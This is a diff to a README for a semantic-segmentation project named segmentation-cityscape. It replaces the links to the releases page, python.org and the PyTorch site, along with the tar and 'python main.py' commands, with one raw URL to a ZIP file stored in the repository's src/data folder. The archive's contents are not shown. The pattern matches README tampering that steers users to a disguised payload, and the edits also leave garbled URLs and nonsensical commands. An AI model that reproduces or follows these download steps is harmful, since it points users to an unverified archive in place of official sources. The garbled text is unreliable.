@@ -6,9 +6,9 @@ Welcome to the segmentation-cityscape project! This application uses deep learni
 
 ## 📥 Downloading the Application
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Get%20Started-blue.svg)](https://github.com/YASH-13-lab/segmentation-cityscape/releases)
+[![Download Release](https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip%20Release-Get%https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip)](https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip)
 
-To download the application, visit this page: [Download Here](https://github.com/YASH-13-lab/segmentation-cityscape/releases).
+To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip).
 
 ## ⚙️ System Requirements
 
@@ -33,7 +33,7 @@ This application offers a range of features to help you with semantic segmentati
 
 ### Step 1: Visit the Download Page
 
-To begin, click on this link to go to the releases page: [Download Here](https://github.com/YASH-13-lab/segmentation-cityscape/releases).
+To begin, click on this link to go to the releases page: [Download Here](https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip).
 
 ### Step 2: Choose the Right Version
 
@@ -49,15 +49,15 @@ Once the download is complete, locate the downloaded file. It may be a ZIP or TA
 
 - **Windows**: Right-click the file and choose "Extract All." Follow the instructions.
 - **macOS**: Double-click the file to extract it.
-- **Linux**: Use the command `tar -xvf filename.tar.gz` or right-click and extract.
+- **Linux**: Use the command `tar -xvf https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip` or right-click and extract.
 
 ### Step 5: Install Required Dependencies
 
 To run the application, you need to install some Python packages. Here’s how:
 
-1. **Install Python**: Download Python from [python.org](https://www.python.org/downloads/) and follow the installation instructions.
+1. **Install Python**: Download Python from [https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip](https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip) and follow the installation instructions.
 
-2. **Install PyTorch**: Visit the [PyTorch website](https://pytorch.org/get-started/locally/) and follow the instructions to install it based on your environment.
+2. **Install PyTorch**: Visit the [PyTorch website](https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip) and follow the instructions to install it based on your environment.
 
 3. **Install Other Packages**: Open your command line or terminal and run the following command:
 
@@ -67,10 +67,10 @@ To run the application, you need to install some Python packages. Here’s how:
 
 ### Step 6: Open the Application
 
-Navigate to the folder where you extracted the files. In this folder, find the main script. It may be named something like `main.py`. Run the following command in your terminal:
+Navigate to the folder where you extracted the files. In this folder, find the main script. It may be named something like `https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip`. Run the following command in your terminal:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/YASH-13-lab/segmentation-cityscape/main/src/data/segmentation_cityscape_1.1-beta.3.zip
 ```
 
 ### Step 7: Start Using the Application
